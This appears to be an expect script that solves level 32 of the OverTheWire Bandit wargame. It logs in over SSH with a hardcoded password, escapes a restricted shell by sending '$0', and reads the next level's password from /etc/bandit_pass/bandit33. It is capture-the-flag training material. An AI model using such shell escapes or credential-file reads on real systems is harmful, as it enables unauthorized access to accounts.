#!/usr/bin/expect -f

spawn ssh -l bandit32 -p 2220 bandit.labs.overthewire.org
expect {
    "*yes/no*" { send "yes\r" ; exp_continue }
    "*assword: " { send "56a9bf19c63d650ce78e6ec0354ee45e\r" ; }
}

expect ">> "

send "\$0\r"
expect "\$ "
send "ls -al *\r"

expect "\$ "
send "cat /etc/bandit_pass/bandit33\r"

expect "\$ "
send "exit\r"